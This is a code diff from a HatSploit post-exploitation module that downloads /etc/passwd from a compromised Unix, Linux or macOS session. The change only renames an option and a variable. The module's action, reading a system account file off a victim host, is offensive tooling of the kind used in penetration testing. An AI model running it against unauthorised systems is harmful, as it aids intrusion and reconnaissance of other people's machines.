@@ -31,7 +31,7 @@ class HatSploitModule(Module, SessionTools):
             'Type': "session->[unix,linux,macos]",
             'Required': True
         },
-        'LFILE': {
+        'LPATH': {
             'Description': "Local path.",
             'Value': None,
             'Type': None,
@@ -40,8 +40,8 @@ class HatSploitModule(Module, SessionTools):
     }
 
     def run(self):
-        session, local_file = self.parse_options(self.options)
+        session, local_path = self.parse_options(self.options)
         session = self.get_session(session)
 
         if session:
-            session.download('/etc/passwd', local_file)
+            session.download('/etc/passwd', local_path)
